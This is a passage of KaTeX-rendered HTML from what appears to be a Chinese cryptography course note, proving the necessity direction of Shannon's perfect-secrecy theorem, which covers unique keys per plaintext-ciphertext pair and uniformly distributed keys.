style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>，均存在唯一密钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>，使得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>e</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">e_k(x)=y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>。</font></p><p>证明：</p><p>充分性：见定理1的证明</p><p>必要性：该密码体制具有完全保密性，故<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">]</mo><mo>=</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">Pr[y|x]=Pr[y]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span></span></span></span>，这表示对于任意的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>∈</mo><mi>P</mi><mo separator="true">,</mo><mi>y</mi><mo>∈</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">x\in P,y\in C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>均存在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>∈</mo><mi>K</mi></mrow><annotation encoding="application/x-tex">k\in K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span>使得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>e</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">e_k(x)=y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>（否则<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">]</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">Pr[y|x]=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>，与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mo stretchy="false">]</mo><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">Pr[y]&gt;0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>矛盾）<br />又如果存在有两个<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>k</mi><mn>2</mn></msub><mo>∈</mo><mi>K</mi></mrow><annotation encoding="application/x-tex">k_1,k_2\in K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span>，均有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>e</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">e_k(x)=y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>，由于|C|=|K|，则就存在有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>y</mi><mo>∗</mo></msup><mo>∈</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">y^*\in C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8831359999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>，不存在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>∈</mo><mi>K</mi></mrow><annotation encoding="application/x-tex">k\in K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span>，使得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>e</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>y</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">e_k(x)=y^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8831359999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>，与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mo stretchy="false">]</mo><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">Pr[y]&gt;0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>矛盾<br />故对于一个确定的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>∈</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">x\in P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>，能够建立双射<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>:</mo><mi>K</mi><mo>→</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">Q:K\rightarrow C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo stretchy="false">(</mo><mi>k</mi><mo stretchy="false">)</mo><mo>=</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">Q(k)=y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Q</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>表示<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">k(x)=y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>。</p><p><font color=blue>k不变时，x与y对应证法</font><br />由于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">]</mo><mo>=</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">Pr[y|x]=Pr[y]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span></span></span></span>，对于确定的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">]</mo><mo>=</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>k</mi><mo>∈</mo><mi>K</mi><mo>:</mo><msub><mi>e</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>y</mi><mo stretchy="false">]</mo><mo>=</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">Pr[y|x]=Pr[k\in K:e_k(x)=y]=Pr[y]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span></span></span></span>。如果改变x的值，可以得到：对于确定的k，有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>k</mi><mo stretchy="false">]</mo><mo>=</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><msub><mi>y</mi><mn>1</mn></msub><mo stretchy="false">]</mo><mo>=</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><msub><mi>y</mi><mn>2</mn></msub><mo stretchy="false">]</mo><mo>=</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>=</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><msub><mi>y</mi><mi>n</mi></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">Pr[k]=Pr[y_1]=Pr[y_2]=...=Pr[y_n]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>，对于每个<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>均是如此，故密钥取值概率相等，均为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mrow><mi mathvariant="normal">∣</mi><mi>K</mi><mi mathvariant="normal">∣</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{|K|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.365108em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span 